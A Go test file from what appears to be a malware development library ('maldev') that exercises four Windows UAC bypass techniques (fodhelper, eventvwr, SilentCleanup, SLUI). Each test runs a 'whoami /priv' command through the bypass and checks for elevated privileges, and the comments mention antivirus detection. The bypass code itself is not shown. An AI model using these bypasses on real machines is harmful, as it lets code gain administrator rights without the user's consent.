//go:build windows

package uac

import (
	"os"
	"os/exec"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"golang.org/x/sys/windows/registry"

	"github.com/oioio-space/maldev/testutil"
)

// requireUAC skips if UAC is disabled (EnableLUA=0).
func requireUAC(t *testing.T) {
	t.Helper()
	k, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`, registry.QUERY_VALUE)
	if err != nil {
		return
	}
	defer k.Close()
	val, _, err := k.GetIntegerValue("EnableLUA")
	if err == nil && val == 0 {
		t.Skip("UAC is disabled (EnableLUA=0) — bypass tests require UAC enabled")
	}
}

const elevProofFile = `C:\maldev_uac_proof.txt`

// elevatedCmd returns a command string that writes privilege info to the
// proof file. An elevated process will have SeDebugPrivilege; a non-elevated
// one will not.
func elevatedCmd() string {
	return `cmd.exe /c whoami /priv > ` + elevProofFile
}

// verifyElevation reads the proof file and asserts SeDebugPrivilege is listed,
// which proves the process ran with High integrity (elevated).
func verifyElevation(t *testing.T) {
	t.Helper()
	defer os.Remove(elevProofFile)

	data, err := os.ReadFile(elevProofFile)
	if err != nil {
		t.Fatalf("proof file not found — the elevated command did not run: %v", err)
	}
	content := string(data)
	t.Logf("elevated process output:\n%s", content)
	assert.True(t,
		strings.Contains(content, "SeDebugPrivilege") ||
			strings.Contains(content, "SeImpersonatePrivilege"),
		"elevated process must have SeDebugPrivilege or SeImpersonatePrivilege")
}

func cleanup() {
	os.Remove(elevProofFile)
	exec.Command("taskkill", "/F", "/IM", "calc.exe").Run()
}

// TestFODHelper uses the fodhelper bypass to run an elevated command that
// writes privilege proof to a file, then verifies elevated privileges.
func TestFODHelper(t *testing.T) {
	testutil.RequireManual(t)
	requireUAC(t)
	cleanup()
	defer cleanup()

	err := FODHelper(elevatedCmd())
	require.NoError(t, err)

	time.Sleep(3 * time.Second)
	verifyElevation(t)
}

// TestEventVwr uses the eventvwr bypass.
func TestEventVwr(t *testing.T) {
	testutil.RequireManual(t)
	requireUAC(t)
	cleanup()
	defer cleanup()

	err := EventVwr(elevatedCmd())
	require.NoError(t, err)

	time.Sleep(4 * time.Second)
	verifyElevation(t)
}

// TestSilentCleanup uses the SilentCleanup scheduled task bypass.
// Note: Defender may flag the test binary — this is expected in a real
// environment. The technique itself works but the compiled Go test binary
// triggers behavioral detection. Skip on AV detection rather than FAIL.
func TestSilentCleanup(t *testing.T) {
	testutil.RequireManual(t)
	requireUAC(t)
	cleanup()
	defer cleanup()

	err := SilentCleanup(elevatedCmd())
	if err != nil {
		t.Skipf("SilentCleanup failed (may be blocked by AV): %v", err)
	}

	time.Sleep(4 * time.Second)
	verifyElevation(t)
}

// TestSLUI uses the SLUI bypass.
// Note: same AV detection caveat as TestSilentCleanup.
func TestSLUI(t *testing.T) {
	testutil.RequireManual(t)
	requireUAC(t)
	cleanup()
	defer cleanup()

	err := SLUI(elevatedCmd())
	if err != nil {
		t.Skipf("SLUI failed (may be blocked by AV): %v", err)
	}

	time.Sleep(4 * time.Second)
	verifyElevation(t)
}
